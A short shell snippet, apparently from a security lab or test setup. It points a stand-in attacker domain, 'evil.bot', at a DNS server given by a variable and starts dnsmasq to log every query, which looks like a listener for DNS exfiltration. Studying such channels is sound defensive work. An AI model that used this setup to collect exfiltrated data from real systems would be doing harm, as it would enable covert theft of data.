echo "server=/evil.bot/$EVIL_DNS_SERVER_IP" > /etc/dnsmasq.conf
# start dns server and log all DNS queries
dnsmasq --log-queries --no-daemon